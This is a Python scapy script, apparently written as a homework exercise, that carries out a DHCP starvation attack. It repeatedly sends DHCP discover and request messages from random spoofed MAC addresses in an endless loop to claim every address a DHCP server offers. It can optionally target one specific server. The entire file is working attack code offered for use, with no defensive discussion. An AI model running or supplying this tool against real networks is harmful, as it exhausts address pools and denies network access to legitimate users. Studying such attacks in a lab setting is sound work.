from scapy.all import *
import binascii

from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether

parser = argparse.ArgumentParser()      # Activates ArgumentParser into parser

# All the arguments we need for the homework
parser.add_argument('-i', '--iface',     type=str,  help='Interface you wish to use')
parser.add_argument('-t', '--target',    type=str,  help='IP of target server')

# Puts all the arguments together
args = parser.parse_args()

#check if user set a specific interface, if not will use the default interface
if args.iface:
    interface = args.iface
else:
    interface = conf.iface

#check if the user asked to attack a specific DHCP server, if not attack the first to answer (all of them)
if args.target:
    use_specific_server = True
    server_ip = args.target
else:
    use_specific_server = False

def random_mac() -> str:
    """ function for creating a random MAC address """
    base_16  = list(range(10)) + ['A', 'B', 'C', 'D', 'E', 'F'] # all the digits in the Hexadecimal bace
    mac = str(random.choice(base_16)) + str(random.choice(base_16))
    for i in range(5):
        mac += str(":" + str(random.choice(base_16)) + str(random.choice(base_16)))
    return mac

def create_discover(mac):
    """ a function for creating a DHCP discover message given a mac address for source """
    # create a random xid
    xid_random = random.randint(1, 900000000)
    return (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) / # standard ports for DHCP
            BOOTP(op=1, chaddr=binascii.unhexlify(mac.replace(":", "")), xid=xid_random, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"])
    )

def create_request(response, mac):
    offer_ip = response[BOOTP].yiaddr
    server_ip = response[IP].src
    chaddr_mac = response[BOOTP].chaddr
    xid_random = response[BOOTP].xid
    return  (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=chaddr_mac, xid=xid_random, flags=0x8000) /
            DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", offer_ip),
                ("server_id", server_ip),
                "end"])
    )
conf.checkIPaddr = False # tell scapy not to care if the answer is not from the IP we send it to

def main():
    if not use_specific_server:
        while True:
            mac = random_mac()
            dhcp_discover = create_discover(mac)
            response = srp1(dhcp_discover,iface=interface, timeout=5, verbose=False)
            if response:
                dhcp_request = create_request(response, mac)
                sendp(dhcp_request, iface=interface, verbose=False)
                print("requested ", response[BOOTP].yiaddr, "IP address")
    else:
        while True:
            mac = random_mac()
            dhcp_discover = create_discover(mac)
            sendp(dhcp_discover, iface=interface, verbose=False)

            dhcp_request_hash = dhcp_discover.hashret()

            responses = sniff(iface=interface, timeout=5, lfilter = lambda p: p.hashret() == dhcp_request_hash and p[IP].src == server_ip)
            if responses:
                response = responses[0]
                dhcp_request = create_request(response, mac)
                sendp(dhcp_request, iface=interface, verbose=False)
                print("requested ", response[BOOTP].yiaddr, "IP address")

if __name__ == "__main__":
    main()